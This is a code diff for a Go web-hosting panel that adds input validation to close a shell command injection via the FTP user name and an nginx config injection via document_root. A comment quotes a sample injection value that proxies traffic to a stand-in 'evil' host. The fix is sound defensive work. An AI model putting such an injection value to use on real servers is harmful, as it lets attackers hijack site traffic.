@@ -386,6 +386,20 @@ func (s *DomainService) Create(ctx context.Context, req *models.CreateDomainRequ
 		return nil, fmt.Errorf("invalid domain name %q: only letters, digits, '.', '-' and '_' are allowed", req.Domain)
 	}
 
+	// Security (audit §8d): req.User is interpolated, UNQUOTED, into shell
+	// commands too — it becomes the FTP virtual-user name in
+	// `bash -c "... pure-pw useradd <user> ..."` (agent.CreateFTPAccount) and
+	// flows into chown/su paths. Mongo-existence (below) normally constrains
+	// it to a panel-provisioned username, but gate it at the boundary with the
+	// same shell-safe charset as the domain so a crafted req.User can never
+	// break out of its quoting context and run commands as root. A legitimate
+	// linux username is always within this set; anything outside it could not
+	// own a working account anyway.
+	req.User = strings.TrimSpace(req.User)
+	if !validator.IsSafeDNSName(req.User) {
+		return nil, fmt.Errorf("invalid user name %q: only letters, digits, '.', '-' and '_' are allowed", req.User)
+	}
+
 	// Validate that the user account exists
 	userCol := s.db.Collection(database.ColUsers)
 	count, _ := userCol.CountDocuments(ctx, bson.M{"username": req.User})
@@ -1384,8 +1398,18 @@ func (s *DomainService) SetDocumentRoot(ctx context.Context, id string, docRoot 
 		return fmt.Errorf("domain not found: %w", err)
 	}
 	docRoot = strings.TrimSpace(docRoot)
-	if docRoot != "" && !strings.HasPrefix(docRoot, "/") {
-		return fmt.Errorf("document_root must be an absolute path (e.g. /home/user/laravel-app/public)")
+	if docRoot != "" {
+		if !strings.HasPrefix(docRoot, "/") {
+			return fmt.Errorf("document_root must be an absolute path (e.g. /home/user/laravel-app/public)")
+		}
+		// Security (audit §8): docRoot is written verbatim into the nginx `root`
+		// directive. Without a charset gate a value like
+		// `/home/u/pub; } location / { proxy_pass http://evil; }` (or one with a
+		// newline) injects additional nginx directives — nginx -t would still
+		// accept a well-formed payload. Restrict to a safe absolute-path charset.
+		if !validator.IsSafeAbsPath(docRoot) {
+			return fmt.Errorf("document_root contains invalid characters; only letters, digits, '/', '.', '-' and '_' are allowed")
+		}
 	}
 	vhostCfg := &agent.VhostConfig{
 		Domain:       domain.Domain,
